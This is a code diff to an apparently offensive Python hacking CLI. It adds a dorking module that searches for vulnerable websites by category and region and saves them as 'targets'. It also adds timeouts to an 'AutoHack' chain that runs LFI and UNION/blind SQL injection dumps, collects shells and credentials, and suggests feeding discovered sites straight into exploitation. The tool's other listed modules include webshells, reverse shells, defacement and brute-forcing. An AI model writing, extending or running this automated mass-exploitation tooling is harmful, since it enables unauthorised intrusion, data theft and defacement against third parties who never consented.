+        print(f"  {C}◉{N} Category: {Y}{self.category}{N}  Region: {Y}{self.region}{N}  Max targets: {Y}{self.pages*10}{N}")
+        print(f"  {C}◉{N} Query(s): {len(queries)}")
+        for q in queries[:3]:
+            print(f"    {W}{q[:90]}{N}")
+        print()
+
+        all_raw = set()
+        for qi, q in enumerate(queries[:3], 1):
+            print(f"  {Y}[{qi}/{len(queries[:3])}]{N} {W}{q[:70]}{N}")
+            for attempt in range(2):
+                print(f"    {C}▶{N} Searching DuckDuckGo...", end="\r")
+                urls = self._search_ddgs(q, max_results=self.pages*10)
+                if urls:
+                    print(f"    {G}✔{N} {len(urls)} URLs found")
+                    all_raw.update(urls)
+                    break
+                print(f"    {Y}−{N} No results. {attempt == 0 and 'Retrying...' or ''}", end="" if attempt == 0 else "\n")
+
+        if not all_raw:
+            print(f"\n  {R}✘{N} No results. Try different dork/region or use custom -d.\n")
+            return []
+
+        unique = sorted(all_raw)[:80]
+        print(f"\n  {C}▶{N} Validating {len(unique)} unique URLs...")
+        valid = []
+        for i, u in enumerate(unique, 1):
+            print(f"    {C}[{i}/{len(unique)}]{N} {W}{u[:60]}{N}...", end="\r")
+            v = self._validate(u)
+            if v:
+                valid.append(v)
+                print(f"    {G}✔{N} {W}{u[:55]:<55}{N}  {v['status']}  {v['server']:<15} {v['title'][:30]}")
+
+        self.results = valid
+        fname = f"dork_{self.category}_{self.region}.txt"
+        with open(fname, "w") as f:
+            for v in valid: f.write(f"{v['url']} | HTTP {v['status']} | {v['server']} | {v['title']}\n")
+
+        print(f"\n  {G}{'═'*50}{N}")
+        print(f"  {G}✔{N} {len(valid)} valid target(s)")
+        print(f"  {C}📁{N} Saved: {Y}{fname}{N}")
+        print(f"\n  {D}Tip: pipe results to autohack:{N}")
+        for v in valid[:5]:
+            print(f"    {C}autohack{N} {Y}{v['url']}{N} --lhost YOUR_IP")
+        print()
+        return valid
+
+
+# ══════════════════════════════════════════════════════
 #  AUTO HACK — Full Auto Exploitation Chain
 # ══════════════════════════════════════════════════════
 
@@ -3886,35 +4235,53 @@ class AutoHack:
             self._log("cms", "ok", "")
         except: self._log("cms", "fail", "")
 
-        # PHASE 3: LFI
+        # PHASE 3: LFI (30s timeout)
         print(f"\n  {R}{BOLD}◆ PHASE 3: LFI{N}")
         try:
             if "=" in self.base_url:
                 parsed = urlparse(self.base_url)
-                params = list(parse_qs(parsed.query).keys())
-                if params:
-                    LFIExploiter(self.base_url, params[0], self.bypass).scan()
-                    self._log("lfi", "ok", f"param={params[0]}")
+                pnames = list(parse_qs(parsed.query).keys())
+                if pnames:
+                    _ex = concurrent.futures.ThreadPoolExecutor(max_workers=1)
+                    try:
+                        _ex.submit(lambda: LFIExploiter(self.base_url, pnames[0], self.bypass).scan()).result(timeout=30)
+                        self._log("lfi", "ok", f"param={pnames[0]}")
+                    finally:
+                        _ex.shutdown(wait=False)
+        except (concurrent.futures.TimeoutError, TimeoutError):
+            print(f"  {Y}⚠ LFI timed out (30s){N}")
+            self._log("lfi", "timeout", "")
         except: self._log("lfi", "fail", "")
 
-        # PHASE 4: SQLi (UNION + Blind)
+        # PHASE 4: SQLi (UNION + Blind, 60s timeout)
         print(f"\n  {R}{BOLD}◆ PHASE 4: SQL INJECTION{N}")
         sqli_creds = []
         if "=" in self.base_url:
-            param = list(parse_qs(urlparse(self.base_url).query).keys())[0] if parse_qs(urlparse(self.base_url).query).keys() else None
-            try:
-                print(f"  {C}▶{N} Trying UNION-based SQLi...")
-                sqli = SQLAutoExploit(self.base_url, "GET", None, self.bypass)
-                data = sqli.dump_all()
-                if data: self.results["sqli_data"] = data; self._log("sqli", "ok", "union")
-            except: self._log("sqli", "fail", "union")
-            if not self.results.get("sqli_data"):
+            pnames = list(parse_qs(urlparse(self.base_url).query).keys())
+            pname = pnames[0] if pnames else None
+            def _run_sqli(pn):
                 try:
-                    print(f"  {C}▶{N} Trying Blind SQLi...")
-                    bsqli = BlindSQLiExploiter(self.base_url, param)
-                    bdata = bsqli.dump_all()
-                    if bdata: self.results["sqli_data"] = bdata; self._log("sqli", "ok", "blind")
-                except: self._log("sqli", "fail", "blind")
+                    print(f"  {C}▶{N} Trying UNION-based SQLi...")
+                    sqli = SQLAutoExploit(self.base_url, "GET", None, self.bypass)
+                    data = sqli.dump_all()
+                    if data: self.results["sqli_data"] = data; self._log("sqli", "ok", "union")
+                except: self._log("sqli", "fail", "union")
+                if not self.results.get("sqli_data") and pn:
+                    try:
+                        print(f"  {C}▶{N} Trying Blind SQLi...")
+                        bsqli = BlindSQLiExploiter(self.base_url, pn, bypass=self.bypass)
+                        bdata = bsqli.dump_all()
+                        if bdata: self.results["sqli_data"] = bdata; self._log("sqli", "ok", "blind")
+                    except: self._log("sqli", "fail", "blind")
+            try:
+                _ex2 = concurrent.futures.ThreadPoolExecutor(max_workers=1)
+                try:
+                    _ex2.submit(_run_sqli, pname).result(timeout=60)
+                finally:
+                    _ex2.shutdown(wait=False)
+            except (concurrent.futures.TimeoutError, TimeoutError):
+                print(f"  {Y}⚠ SQLi timed out (60s){N}")
+                self._log("sqli", "timeout", "")
         else:
             self._log("sqli", "skip", "no params")
 
@@ -4048,10 +4415,17 @@ class AutoHack:
         print(f"\n  {R}{BOLD}{'═'*55}{N}")
         print(f"  {R}{BOLD}AUTO HACK COMPLETE ({elapsed:.1f}s){N}")
         print(f"  {R}{BOLD}{'═'*55}{N}")
-        print(f"\n  {R}◉{N} Shells: {Y}{len(self.results['shells'])}{N}")
-        print(f"  {G}◉{N} SQLi:   {Y}{'DATA' if self.results.get('sqli_data') else 'NONE'}{N}")
-        print(f"  {C}◉{N} Ports:  {Y}{len(self.results.get('ports',[]))}{N}")
-        print(f"  {M}◉{N} Creds:  {Y}{len(self.results.get('creds',[]))}{N}")
+        print(f"\n  {R}◉{N} Ports:  {Y}{len(self.results.get('ports',[]))}{N} open")
+        print(f"  {M}◉{N} Shells: {Y}{len(self.results['shells'])}{N}")
+        has_sqli = self.results.get('sqli_data')
+        print(f"  {G}◉{N} SQLi:   {Y}{len(has_sqli) if has_sqli else 'NONE'}{N}")
+        print(f"  {C}◉{N} Creds:  {Y}{len(self.results.get('creds',[]))}{N}")
+        phase_ok = sum(1 for p in self.phases if p["status"] in ("ok","sent"))
+        phase_total = len(self.phases)
+        print(f"  {D}◉{N} Phases: {Y}{phase_ok}/{phase_total}{N} passed")
+        if self.results.get("shells"):
+            for s in self.results["shells"][:3]:
+                print(f"    {G}→{N} {s.get('url','')[:60]}")
         print()
         # Generate report
         try:
@@ -4145,6 +4519,9 @@ class NusaCLI:
     {G}session load{N}   {D}<filename>{N}
     {G}session show{N}   {D}[show current session status]{N}
 
+  {R}◈ DORK / TARGET DISCOVERY{N}
+    {G}dork{N}            {D}[-d <dork>] [--category sqli|lfi|rfi|admin|wp|phpinfo|upload|cve|config] [--region id|global|us|jp|...] [--pages 2]{N}
+
   {G}◈ NETWORK / MISC{N}
     {G}portscan{N}       {D}<target> [-p ports]{N}
     {G}servicedetect{N}  {D}-t <target> -p <ports>{N}
@@ -4180,6 +4557,13 @@ class NusaCLI:
                 u = self._get(args,"-u","--url")
                 if not u: print(f"  {R}✘{N} Usage: csrf -u <url>"); return
                 CSRFScanner(u).scan()
+            elif cmd == "dork":
+                dork = self._get(args,"-d","--dork")
+                cat = self._get(args,"--category") or "sqli"
+                region = self._get(args,"--region") or "global"
+                pages = int(self._get(args,"--pages") or "2")
+                proxy = self._get(args,"--proxy")
+                GoogleDorker(dork, cat, region, pages, proxy).run()
             elif cmd == "cve":
                 print(f"  {Y}⚠{N} CVE Checker runs automatically from service banners.\n  Use {C}autopwn{N} for full scan with banner detection.\n")
             elif cmd == "urlscan":
@@ -4384,6 +4768,14 @@ def direct(module, args):
             target = a.tflag or a.target
             if not target: print("[-] portscan <target> [-p ports]"); return
             PortScanner(target,a.ports,a.timeout).run()
+        elif module == "dork":
+            p = argparse.ArgumentParser(prog="dork")
+            p.add_argument("-d","--dork",help="Custom dork query (overrides --category)")
+            p.add_argument("--category",choices=list(GoogleDorker.DORKS.keys()),default="sqli")
+            p.add_argument("--region",choices=list(GoogleDorker.REGION_DOMAINS.keys()),default="global")
+            p.add_argument("--pages",type=int,default=2); p.add_argument("--proxy")
+            a = p.parse_args(args)
+            GoogleDorker(a.dork, a.category, a.region, a.pages, a.proxy).run()
         elif module == "paramspider":
             p = argparse.ArgumentParser(prog="paramspider")
             p.add_argument("-d","--domain",help="Domain name")
@@ -4564,7 +4956,7 @@ def direct(module, args):
             ServiceBruteforcer(a.target, a.port, a.service, a.usernames, a.passwords, a.threads).run()
         else:
             print(f"  {R}✘{N} Unknown: {Y}{module}{N}")
-            print(f"  {C}◈{N} Available: {G}autohack autopwn webshell revshell lfi sqlauto blindsqli cms svcexploit svcbrute scan cors csrf urlscan portscan servicedetect xss sqli deface subdomain dns whois dirbust loginbf autobf hashcrack paramspider report session update{N}")
+            print(f"  {C}◈{N} Available: {G}autohack autopwn webshell revshell lfi sqlauto blindsqli cms svcexploit svcbrute scan cors csrf urlscan portscan servicedetect xss sqli deface subdomain dns whois dirbust loginbf autobf hashcrack paramspider report session update dork{N}")
     except SystemExit: pass
     except Exception as e: print(f"  {R}✘ Error:{N} {e}")
 
@@ -4582,7 +4974,7 @@ def main():
         "loginbf","hashcrack","hash","report","paramspider","deface","autobf",
         "autologin","help","webshell","revshell","reverseshell","lfi","sqlauto",
         "sqlautodump","cms","svcexploit","servicex","blindsqli","blind-sqli",
-        "svcbrute","servicebrute","session","update"):
+        "svcbrute","servicebrute","session","update","dork"):
         AutoPwn(sys.argv[1]).run(); return
     print(BANNER); direct(sys.argv[1], sys.argv[2:])
 
